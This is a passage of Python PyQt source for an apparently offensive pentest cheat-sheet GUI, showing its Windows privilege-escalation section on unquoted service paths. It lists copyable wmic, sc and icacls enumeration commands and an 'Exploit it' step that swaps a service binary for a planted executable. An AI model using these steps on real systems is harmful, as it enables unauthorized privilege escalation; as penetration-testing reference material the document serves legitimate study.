        self.wpe_28_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_28_spacer1
        if hasattr(self, 'wpe_28_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_28_spacer1)
            self.wpe_28_spacer1.deleteLater()
        self.wpe_28_spacer1 = QLabel()
        self.wpe_28_spacer1.setFixedWidth(40)
        self.wpe_28_spacer1.setFixedHeight(50)
     
        # wpe_28_spacer2
        if hasattr(self, 'wpe_28_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_28_spacer2)
            self.wpe_28_spacer2.deleteLater()
        self.wpe_28_spacer2 = QLabel()
        self.wpe_28_spacer2.setFixedWidth(40)
        self.wpe_28_spacer2.setFixedHeight(50)
     
        # wpe_28 spacer & divider layout
        self.tab4_container_layout.insertWidget(484, self.wpe_28_spacer1)
        self.tab4_container_layout.insertWidget(485, self.wpe_28_divider1)
        self.tab4_container_layout.insertWidget(486, self.wpe_28_divider2)
        self.tab4_container_layout.insertWidget(487, self.wpe_28_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_29
        if hasattr(self, 'wpe_29'):
            self.tab4_container_layout.removeWidget(self.wpe_29)
            self.wpe_29.deleteLater()
        self.wpe_29 = QLabel("[ + UNQUOTED SERVICE PATHS ]")
        self.wpe_29.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(488,self.wpe_29)
     
        # wpe_29_Scan1
        if hasattr(self, 'wpe_29_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan1)
            self.wpe_29_Scan1.deleteLater()
        self.wpe_29_Scan1 = QLabel("wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\" |findstr /i /v \"\"\"")
        self.wpe_29_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(489,self.wpe_29_Scan1)
     
        # wpe_29_Scan1_Copy
        if hasattr(self, 'wpe_29_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan1_Copy)
            self.wpe_29_Scan1_Copy.deleteLater()
        self.wpe_29_Scan1_Copy = QPushButton()
        self.wpe_29_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan1.text()))
        self.wpe_29_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan1_Copy)
        label_layout.addWidget(self.wpe_29_Scan1)
        self.tab4_container_layout.insertLayout(490, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(491, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(492, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(493, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(494, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan2
        if hasattr(self, 'wpe_29_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan2)
            self.wpe_29_Scan2.deleteLater()
        self.wpe_29_Scan2 = QLabel("[ - Using SC ]")
        self.wpe_29_Scan2.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(495,self.wpe_29_Scan2)
     
        # wpe_29_Scan3
        if hasattr(self, 'wpe_29_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan3)
            self.wpe_29_Scan3.deleteLater()
        self.wpe_29_Scan3 = QLabel("sc query")
        self.wpe_29_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(496,self.wpe_29_Scan3)
     
        # wpe_29_Scan3_Copy
        if hasattr(self, 'wpe_29_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan3_Copy)
            self.wpe_29_Scan3_Copy.deleteLater()
        self.wpe_29_Scan3_Copy = QPushButton()
        self.wpe_29_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan3.text()))
        self.wpe_29_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan3_Copy)
        label_layout.addWidget(self.wpe_29_Scan3)
        self.tab4_container_layout.insertLayout(497, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(498, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(499, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(500, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(501, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan4
        if hasattr(self, 'wpe_29_Scan4'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan4)
            self.wpe_29_Scan4.deleteLater()
        self.wpe_29_Scan4 = QLabel("sc qc <service name>")
        self.wpe_29_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(502,self.wpe_29_Scan4)
     
        # wpe_29_Scan4_Copy
        if hasattr(self, 'wpe_29_Scan4_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan4_Copy)
            self.wpe_29_Scan4_Copy.deleteLater()
        self.wpe_29_Scan4_Copy = QPushButton()
        self.wpe_29_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan4.text()))
        self.wpe_29_Scan4_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan4_Copy)
        label_layout.addWidget(self.wpe_29_Scan4)
        self.tab4_container_layout.insertLayout(503, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(504, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(505, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(506, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(507, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan5
        if hasattr(self, 'wpe_29_Scan5'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan5)
            self.wpe_29_Scan5.deleteLater()
        self.wpe_29_Scan5 = QLabel("[ -  Use icacls or cacls.exe (both native to Windows) to check binary permissions ]")
        self.wpe_29_Scan5.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(508,self.wpe_29_Scan5)
     
        # wpe_29_Scan6
        if hasattr(self, 'wpe_29_Scan6'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan6)
            self.wpe_29_Scan6.deleteLater()
        self.wpe_29_Scan6 = QLabel("icacls \"C:\\Program Files (x86)\\UNQUOTED_SERVICE_PATH_SOFTWARE\"")
        self.wpe_29_Scan6.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(509,self.wpe_29_Scan6)
     
        # wpe_29_Scan6_Copy
        if hasattr(self, 'wpe_29_Scan6_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan6_Copy)
            self.wpe_29_Scan6_Copy.deleteLater()
        self.wpe_29_Scan6_Copy = QPushButton()
        self.wpe_29_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan6_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan6.text()))
        self.wpe_29_Scan6_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan6 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan6_Copy)
        label_layout.addWidget(self.wpe_29_Scan6)
        self.tab4_container_layout.insertLayout(510, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(511, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(512, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(513, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(514, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan7
        if hasattr(self, 'wpe_29_Scan7'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan7)
            self.wpe_29_Scan7.deleteLater()
        self.wpe_29_Scan7 = QLabel("[ - Exploit it ]")
        self.wpe_29_Scan7.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(515,self.wpe_29_Scan7)
     
        # wpe_29_Scan8
        if hasattr(self, 'wpe_29_Scan8'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan8)
            self.wpe_29_Scan8.deleteLater()
        self.wpe_29_Scan8 = QLabel("move something.exe something.exe.bck")
        self.wpe_29_Scan8.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(516,self.wpe_29_Scan8)
     
        # wpe_29_Scan8_Copy
        if hasattr(self, 'wpe_29_Scan8_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan8_Copy)
            self.wpe_29_Scan8_Copy.deleteLater()
        self.wpe_29_Scan8_Copy = QPushButton()
        self.wpe_29_Scan8_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan8_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan8_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan8.text()))
        self.wpe_29_Scan8_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan8 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan8_Copy)
        label_layout.addWidget(self.wpe_29_Scan8)
        self.tab4_container_layout.insertLayout(517, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(518, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(519, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(520, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(521, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan9
        if hasattr(self, 'wpe_29_Scan9'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan9)
            self.wpe_29_Scan9.deleteLater()
        self.wpe_29_Scan9 = QLabel("move admin1Maint.exe C:\\Program Files\\something\\")
        self.wpe_29_Scan9.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(522,self.wpe_29_Scan9)
     
        # wpe_29_Scan9_Copy
        if hasattr(self, 'wpe_29_Scan9_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan9_Copy)
            self.wpe_29_Scan9_Copy.deleteLater()
        self.wpe_29_Scan9_Copy = QPushButton()
        self.wpe_29_Scan9_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan9_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan9_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan9.text()))
        self.wpe_29_Scan9_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan9 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan9_Copy)
        label_layout.addWidget(self.wpe_29_Scan9)
        self.tab4_container_layout.insertLayout(523, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(524, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(525, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(526, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(527, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan10
        if hasattr(self, 'wpe_29_Scan10'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan10)
            self.wpe_29_Scan10.deleteLater()
        self.wpe_29_Scan10 = QLabel("move admin1Maint.exe something.exe")
        self.wpe_29_Scan10.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(528,self.wpe_29_Scan10)
     
        # wpe_29_Scan10_Copy
        if hasattr(self, 'wpe_29_Scan10_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan10_Copy)
            self.wpe_29_Scan10_Copy.deleteLater()
        self.wpe_29_Scan10_Copy = QPushButton()
        self.wpe_29_Scan10_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan10_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan10_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan10.text()))
        self.wpe_29_Scan10_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan10 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan10_Copy)
        label_layout.addWidget(self.wpe_29_Scan10)
        self.tab4_container_layout.insertLayout(529, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(530, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(531, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(532, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(533, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan11
        if hasattr(self, 'wpe_29_Scan11'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan11)
            self.wpe_29_Scan11.deleteLater()
        self.wpe_29_Scan11 = QLabel("[ - Enumerate out every service and check for Unquoted Bin Paths ]")
        self.wpe_29_Scan11.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(534,self.wpe_29_Scan11)
     
        # wpe_29_Scan12
        if hasattr(self, 'wpe_29_Scan12'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan12)
            self.wpe_29_Scan12.deleteLater()
        self.wpe_29_Scan12 = QLabel("cd \"C:\\Windows\\TEMP\"")
        self.wpe_29_Scan12.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(535,self.wpe_29_Scan12)
     
        # wpe_29_Scan12_Copy
        if hasattr(self, 'wpe_29_Scan12_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan12_Copy)
            self.wpe_29_Scan12_Copy.deleteLater()
        self.wpe_29_Scan12_Copy = QPushButton()
        self.wpe_29_Scan12_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan12_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan12_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan12.text()))
        self.wpe_29_Scan12_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan12 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan12_Copy)
        label_layout.addWidget(self.wpe_29_Scan12)
        self.tab4_container_layout.insertLayout(536, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
        self.wpe_29_divider1 = QFrame()
        self.wpe_29_divider1.setFrameShape(QFrame.HLine)
        self.wpe_29_divider1.setLineWidth(3)
        self.wpe_29_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_29_divider2
        if hasattr(self, 'wpe_29_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider2)
            self.wpe_29_divider2.deleteLater()
        self.wpe_29_divider2 = QFrame()
        self.wpe_29_divider2.setFrameShape(QFrame.HLine)
        self.wpe_29_divider2.setLineWidth(3)
        self.wpe_29_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_29_spacer1
        if hasattr(self, 'wpe_29_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer1)
            self.wpe_29_spacer1.deleteLater()
        self.wpe_29_spacer1 = QLabel()
        self.wpe_29_spacer1.setFixedWidth(40)
        self.wpe_29_spacer1.setFixedHeight(50)
     
        # wpe_29_spacer2
        if hasattr(self, 'wpe_29_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_29_spacer2)
            self.wpe_29_spacer2.deleteLater()
        self.wpe_29_spacer2 = QLabel()
        self.wpe_29_spacer2.setFixedWidth(40)
        self.wpe_29_spacer2.setFixedHeight(50)
     
        # wpe_29 spacer & divider layout
        self.tab4_container_layout.insertWidget(537, self.wpe_29_spacer1)
        self.tab4_container_layout.insertWidget(538, self.wpe_29_divider1)
        self.tab4_container_layout.insertWidget(539, self.wpe_29_divider2)
        self.tab4_container_layout.insertWidget(540, self.wpe_29_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_Scan13
        if hasattr(self, 'wpe_29_Scan13'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan13)
            self.wpe_29_Scan13.deleteLater()
        self.wpe_29_Scan13 = QLabel("sc query state= all | findstr \"SERVICE_NAME:\" >> ServiceNames.txt")
        self.wpe_29_Scan13.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(541,self.wpe_29_Scan13)
     
        # wpe_29_Scan13_Copy
        if hasattr(self, 'wpe_29_Scan13_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_29_Scan13_Copy)
            self.wpe_29_Scan13_Copy.deleteLater()
        self.wpe_29_Scan13_Copy = QPushButton()
        self.wpe_29_Scan13_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_29_Scan13_Copy.setFixedSize(QSize(20,20))
        self.wpe_29_Scan13_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_29_Scan13.text()))
        self.wpe_29_Scan13_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_29_Scan13 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_29_Scan13_Copy)
        label_layout.addWidget(self.wpe_29_Scan13)
        self.tab4_container_layout.insertLayout(542, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_29_divider1
        if hasattr(self, 'wpe_29_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_29_divider1)
            self.wpe_29_divider1.deleteLater()
